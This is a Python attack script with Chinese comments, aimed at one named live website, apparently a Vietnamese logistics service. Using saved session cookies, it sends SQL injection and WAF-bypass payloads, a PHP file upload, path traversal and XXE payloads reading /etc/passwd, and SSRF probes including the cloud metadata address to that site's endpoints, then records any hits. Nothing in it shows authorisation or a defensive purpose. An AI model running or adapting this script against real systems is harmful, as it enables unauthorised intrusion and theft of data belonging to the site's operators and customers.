#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import requests
import urllib.parse
import json
import time
import re
from concurrent.futures import ThreadPoolExecutor
import urllib3
urllib3.disable_warnings()

class DeepDigger:
    def __init__(self):
        self.base_url = "https://emsone.com.vn"
        self.session = requests.Session()
        self.session.verify = False
        self.load_session()
        self.vulnerabilities = []
        self.extracted_data = {}
        
    def load_session(self):
        try:
            with open('session_cookies.json', 'r') as f:
                cookies = json.load(f)
                self.session.cookies.update(cookies)
        except:
            pass
    
    def test_all_handle_endpoints(self):
        """测试所有Handle端点"""
        print("[*] 深度测试Handle端点...")
        
        endpoints = [
            '/Handle/SearchListCustomer',
            '/Handle/SearchListProvince',
            '/Handle/SearchListWardByDistrictID',
            '/Handle/SearchListDistrictByProvinceID',
            '/Handle/SearchListWareHouse',
            '/Handle/SearchListProductVariantByWareHouseID',
            '/Handle/SearchListFunctionalByGroupPermissionID',
            '/Handle/TransportPostageCharged',
            '/Handle/SearchPWDByVMapCode',
            '/Handle/SearchPWDByVNPMapsAutocomplete',
            '/Handle/SearchPWDByVNPMapsSearch',
            '/Handle/SearchPWDByEMSVMapsSearch',
            '/Handle/SearchPWDByEMSMapsSearch',
            '/Handle/VNPMapsAutocomplete',
        ]
        
        # SQL注入payload集合
        sqli_payloads = [
            "1' OR '1'='1",
            "1' UNION SELECT NULL--",
            "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT 'TEST'), 0x7e))--",
            "1' AND SLEEP(5)--",
            "1' AND 1=1--",
            "1' AND 1=2--",
            "1' OR 1=1#",
            "1' OR 1=1-- -",
            "1'/**/OR/**/'1'='1",
            "1' OR CHAR(49)=CHAR(49)--",
        ]
        
        results = []
        for endpoint in endpoints:
            print(f"\n[*] 测试: {endpoint}")
            
            # 测试GET参数
            for payload in sqli_payloads[:5]:
                test_urls = [
                    f"{self.base_url}{endpoint}?id={urllib.parse.quote(payload)}",
                    f"{self.base_url}{endpoint}?q={urllib.parse.quote(payload)}",
                    f"{self.base_url}{endpoint}?Type={urllib.parse.quote(payload)}",
                    f"{self.base_url}{endpoint}?DistrictID={urllib.parse.quote(payload)}",
                    f"{self.base_url}{endpoint}?WareHouseID={urllib.parse.quote(payload)}",
                ]
                
                for url in test_urls:
                    try:
                        start = time.time()
                        r = self.session.get(url, timeout=15)
                        elapsed = time.time() - start
                        
                        # 检查特征
                        has_test = 'TEST' in r.text
                        has_xpath = 'XPATH' in r.text.upper()
                        has_error = 'error' in r.text.lower() or 'sql' in r.text.lower()
                        has_delay = elapsed > 4
                        
                        if has_test or has_xpath or has_error or has_delay:
                            print(f"    [!] 可能有效: {url}")
                            if has_test:
                                print(f"        [+] 包含TEST")
                            if has_xpath:
                                print(f"        [+] XPATH错误")
                            if has_delay:
                                print(f"        [+] 时间延迟: {elapsed:.2f}s")
                            results.append({
                                'endpoint': endpoint,
                                'url': url,
                                'payload': payload,
                                'type': 'SQL Injection'
                            })
                    except:
                        pass
                
                # 测试POST
                post_data = {
                    'id': payload,
                    'q': payload,
                    'Type': payload,
                    'search': payload,
                }
                try:
                    r = self.session.post(f"{self.base_url}{endpoint}", data=post_data, timeout=10)
                    if 'TEST' in r.text or 'XPATH' in r.text.upper() or 'error' in r.text.lower():
                        print(f"    [!] POST可能有效: {endpoint}")
                        results.append({
                            'endpoint': endpoint,
                            'method': 'POST',
                            'payload': payload,
                            'type': 'SQL Injection (POST)'
                        })
                except:
                    pass
                
                # 测试JSON POST
                try:
                    r = self.session.post(f"{self.base_url}{endpoint}", json=post_data, timeout=10)
                    if 'TEST' in r.text or 'XPATH' in r.text.upper():
                        print(f"    [!] JSON POST可能有效: {endpoint}")
                except:
                    pass
        
        return results
    
    def test_other_account_endpoints(self):
        """测试其他Account端点"""
        print("\n[*] 测试其他Account端点...")
        
        endpoints = [
            '/Account/GetUserInfoById',
            '/Account/GetUserById',
            '/Account/GetById',
            '/Account/UserInfo',
            '/Account/Info',
            '/Account/Details',
            '/Account/Profile',
            '/Account/GetProfile',
            '/Account/View',
            '/Account/GetDetails',
            '/Account/GetUser',
            '/Account/Get',
            '/Account/List',
            '/Account/Search',
            '/Account/Query',
            '/Account/Find',
            '/Account/Load',
            '/Account/Fetch',
            '/Account/Retrieve',
        ]
        
        payload = "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT 'TEST'), 0x7e))--"
        
        for endpoint in endpoints:
            url = f"{self.base_url}{endpoint}?id={urllib.parse.quote(payload)}"
            try:
                r = self.session.get(url, timeout=10)
                if r.status_code == 200 or 'TEST' in r.text or 'XPATH' in r.text.upper():
                    print(f"    [!] {endpoint}: Status={r.status_code}")
                    if 'TEST' in r.text:
                        print(f"        [+] 发现TEST")
                        self.vulnerabilities.append({
                            'endpoint': endpoint,
                            'type': 'SQL Injection',
                            'method': 'GET'
                        })
            except:
                pass
    
    def test_file_operations(self):
        """测试文件操作"""
        print("\n[*] 测试文件操作...")
        
        file_endpoints = [
            '/Upload',
            '/File/Upload',
            '/Account/Upload',
            '/Handle/Upload',
            '/api/Upload',
            '/Upload/File',
            '/File/Download',
            '/Download',
            '/Export',
            '/File/Export',
            '/Backup',
            '/File/Backup',
        ]
        
        for endpoint in file_endpoints:
            url = f"{self.base_url}{endpoint}"
            try:
                # GET测试
                r = self.session.get(url, timeout=10)
                if r.status_code in [200, 405]:
                    print(f"    [+] {endpoint}: Status={r.status_code}")
                
                # POST测试（文件上传）
                files = {'file': ('test.php', '<?php phpinfo(); ?>', 'application/x-php')}
                r = self.session.post(url, files=files, timeout=10)
                if r.status_code in [200, 201]:
                    print(f"    [!] 文件上传可能: {endpoint}")
                    self.vulnerabilities.append({
                        'endpoint': endpoint,
                        'type': 'File Upload'
                    })
            except:
                pass
    
    def test_path_traversal(self):
        """测试路径遍历"""
        print("\n[*] 测试路径遍历...")
        
        traversal_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%2F..%2F..%2Fetc%2Fpasswd",
        ]
        
        endpoints = [
            '/File/Download',
            '/Download',
            '/Export',
            '/Handle/Download',
            '/Account/Download',
        ]
        
        for endpoint in endpoints:
            for payload in traversal_payloads:
                url = f"{self.base_url}{endpoint}?file={urllib.parse.quote(payload)}"
                try:
                    r = self.session.get(url, timeout=10)
                    if 'root:' in r.text or 'localhost' in r.text or '127.0.0.1' in r.text:
                        print(f"    [!] 路径遍历: {endpoint}")
                        print(f"        Payload: {payload}")
                        self.vulnerabilities.append({
                            'endpoint': endpoint,
                            'type': 'Path Traversal',
                            'payload': payload
                        })
                except:
                    pass
    
    def test_xxe(self):
        """测试XXE"""
        print("\n[*] 测试XXE...")
        
        xxe_payload = """<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>"""
        
        endpoints = [
            '/api/xml',
            '/Handle/xml',
            '/Account/xml',
            '/Upload',
        ]
        
        for endpoint in endpoints:
            url = f"{self.base_url}{endpoint}"
            try:
                headers = {'Content-Type': 'application/xml'}
                r = self.session.post(url, data=xxe_payload, headers=headers, timeout=10)
                if 'root:' in r.text:
                    print(f"    [!] XXE: {endpoint}")
                    self.vulnerabilities.append({
                        'endpoint': endpoint,
                        'type': 'XXE'
                    })
            except:
                pass
    
    def test_ssrf(self):
        """测试SSRF"""
        print("\n[*] 测试SSRF...")
        
        ssrf_payloads = [
            "http://127.0.0.1:22",
            "http://localhost/admin",
            "file:///etc/passwd",
            "http://169.254.169.254/latest/meta-data/",
        ]
        
        endpoints = [
            '/api/fetch',
            '/api/proxy',
            '/Handle/fetch',
            '/Account/fetch',
        ]
        
        for endpoint in endpoints:
            for payload in ssrf_payloads:
                url = f"{self.base_url}{endpoint}?url={urllib.parse.quote(payload)}"
                try:
                    r = self.session.get(url, timeout=10)
                    if 'SSH' in r.text or 'root:' in r.text or 'localhost' in r.text:
                        print(f"    [!] SSRF: {endpoint}")
                        self.vulnerabilities.append({
                            'endpoint': endpoint,
                            'type': 'SSRF',
                            'payload': payload
                        })
                except:
                    pass
    
    def test_deserialization(self):
        """测试反序列化"""
        print("\n[*] 测试反序列化...")
        
        endpoints = [
            '/api/deserialize',
            '/Handle/deserialize',
            '/Account/deserialize',
        ]
        
        # .NET ViewState测试
        for endpoint in endpoints:
            try:
                data = {'data': 'test'}
                r = self.session.post(f"{self.base_url}{endpoint}", json=data, timeout=10)
                if r.status_code == 200:
                    print(f"    [+] {endpoint}: Status=200")
            except:
                pass
    
    def test_waf_bypass_payloads(self):
        """测试WAF绕过payload"""
        print("\n[*] 测试WAF绕过payload...")
        
        bypass_payloads = [
            "1'/**/OR/**/'1'='1",
            "1'/*comment*/OR/*comment*/'1'='1",
            "1'--%0AOR--%0A'1'='1",
            "1'%20OR%20'1'='1",
            "1'%09OR%09'1'='1",
            "1'%0AOR%0A'1'='1",
            "1' OR CHAR(49)=CHAR(49)--",
            "1' OR ASCII('1')=49--",
            "1' OR UNICODE('1')=49--",
            "1' OR 1=1 LIMIT 1--",
            "1') OR ('1'='1",
            "1' OR 'x'='x",
            "' OR 1=1--",
            "' OR '1'='1",
            "admin'--",
            "admin'/*",
        ]
        
        endpoint = '/Account/GetUserInfo'
        
        for payload in bypass_payloads:
            url = f"{self.base_url}{endpoint}?id={urllib.parse.quote(payload)}"
            try:
                start = time.time()
                r = self.session.get(url, timeout=15)
                elapsed = time.time() - start
                
                if elapsed > 3 or 'XPATH' in r.text.upper() or 'error' in r.text.lower():
                    print(f"    [!] 绕过可能: {payload[:50]}")
                    if elapsed > 3:
                        print(f"        时间延迟: {elapsed:.2f}s")
            except:
                pass
    
    def test_all_parameters(self):
        """测试所有可能的参数"""
        print("\n[*] 测试所有参数组合...")
        
        endpoint = '/Handle/SearchListCustomer'
        params = ['id', 'ID', 'Id', 'user_id', 'userID', 'userId', 'customer_id', 'customerID', 
                  'q', 'query', 'search', 'keyword', 'name', 'email', 'mobile', 'phone',
                  'page', 'limit', 'offset', 'sort', 'order']
        
        payload = "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT 'TEST'), 0x7e))--"
        
        for param in params:
            url = f"{self.base_url}{endpoint}?{param}={urllib.parse.quote(payload)}"
            try:
                r = self.session.get(url, timeout=10)
                if 'TEST' in r.text or 'XPATH' in r.text.upper():
                    print(f"    [!] 参数有效: {param}")
                    self.vulnerabilities.append({
                        'endpoint': endpoint,
                        'parameter': param,
                        'type': 'SQL Injection'
                    })
            except:
                pass
    
    def save_results(self):
        """保存结果"""
        results = {
            'vulnerabilities': self.vulnerabilities,
            'extracted_data': self.extracted_data
        }
        
        with open('deep_dig_results.json', 'w', encoding='utf-8') as f:
            json.dump(results, f, indent=2, ensure_ascii=False)
        
        print(f"\n[+] 发现 {len(self.vulnerabilities)} 个潜在漏洞")
    
    def run_all(self):
        """执行所有测试"""
        print("="*60)
        print("深度挖掘 - 全面攻击面测试")
        print("="*60)
        
        self.test_all_handle_endpoints()
        self.test_other_account_endpoints()
        self.test_file_operations()
        self.test_path_traversal()
        self.test_xxe()
        self.test_ssrf()
        self.test_deserialization()
        self.test_waf_bypass_payloads()
        self.test_all_parameters()
        self.save_results()
        
        print("\n" + "="*60)
        print("深度挖掘完成")
        print("="*60)

if __name__ == "__main__":
    digger = DeepDigger()
    digger.run_all()